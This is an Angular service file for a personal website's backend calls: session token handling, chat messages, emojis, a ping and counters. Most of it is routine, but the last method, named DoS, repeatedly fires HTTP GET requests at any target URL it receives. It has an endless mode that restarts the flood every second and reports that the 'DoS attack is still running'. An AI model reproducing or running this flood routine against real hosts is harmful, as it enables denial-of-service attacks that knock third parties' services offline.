import { HttpClient, HttpHeaders, HttpParams } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { Observable } from 'rxjs';
import { environment } from 'src/environments/environment';
import { UUID } from '../models/uuid';
import { CommandHandler } from '../models/commandHandler';
import { LocalstorageHandlingService } from './localstorage-handling.service';
import { LocalStorageHandler } from '../models/localStorageHandler';

@Injectable({
    providedIn: 'root'
})
export class BackendServiceService {
    apiUrl = environment.apiUrl;
    sessionToken: string = '';

    constructor(
        private http: HttpClient,
        private localstorageHandlingService: LocalstorageHandlingService,

    ) {
        var getDataResponse = LocalStorageHandler.staticLoadData("appData.oldmartijntje.nl", "private.userAccountKey");
        if (!getDataResponse.success) {
            var uuid = UUID.generate();
            this.localstorageHandlingService.addEditRequestToQueue(uuid, "private.userAccountKey");
            this.localstorageHandlingService.immediatlyGoThroughQueue();
            this.sessionToken = uuid;
        } else {
            this.sessionToken = getDataResponse.data;
        }
    }

    addMessage(content: string, username: string): Observable<any> {
        // const body = {
        //     content: content,
        //     username: username,
        // };

        // return this.http.post<any>(`${this.apiUrl}/messages/message.php`, body);
        const headers = new HttpHeaders().set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        let body = new HttpParams();
        body = body.set('content', content);
        body = body.set('username', username);
        body = body.set('sessionToken', this.sessionToken);
        return this.http.post(`${this.apiUrl}/messages/message.php`, body, { headers })
    }

    getMessagesSinceLastCall(id: number): Observable<any> {
        const headers = new HttpHeaders().set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        let body = new HttpParams();
        body = body.set('id', id);
        body = body.set('sessionToken', this.sessionToken);
        return this.http.post(`${this.apiUrl}/messages/getNewMessages.php`, body, { headers });
    }

    getEmoji(): Observable<any> {
        const headers = new HttpHeaders().set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        let body = new HttpParams();
        body = body.set('sessionToken', this.sessionToken);
        return this.http.post(`${this.apiUrl}/messages/emojis.php`, body, { headers });
    }

    getMessages(): Observable<any> {
        // Convert sessionToken to a URL-safe format if needed
        const safeSessionToken = encodeURIComponent(this.sessionToken);

        return this.http.get<any>(`${this.apiUrl}/messages/message.php?sessionToken=${safeSessionToken}`);
    }

    ping(): Observable<any> {
        return this.http.get<any>(`${this.apiUrl}/ping/ping.php`);
    }

    getCounter(counterName: string): Observable<any> {
        // Convert sessionToken to a URL-safe format if needed
        const safeCounterName = encodeURIComponent(counterName);

        return this.http.get<any>(`${this.apiUrl}/counter/counter.php?counter=${safeCounterName}`);
    }

    addCounterIteration(amount: number, counterName: string): Observable<any> {
        const headers = new HttpHeaders().set('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
        let body = new HttpParams();
        body = body.set('name', counterName);
        body = body.set('amount', amount);
        body = body.set('sessionToken', this.sessionToken);
        return this.http.post(`${this.apiUrl}/counter/counter.php`, body, { headers })
    }

    async DoS(target: string, amount: number, endless: boolean = false, obj: CommandHandler): Promise<number> {
        for (let i = 0; i < amount; i++) {
            if (endless && i == amount - 1) {
                obj.appendHistory({ text: "DoS attack is still running...", type: "output" });
            }
            if (endless && i == amount - 1) {
                await new Promise(r => setTimeout(r, 1000));
                i = 0;
            }
            try {
                this.http.get(target).subscribe();
            } catch (error) {
                return i;
            }
        }
        return amount;
    }
}
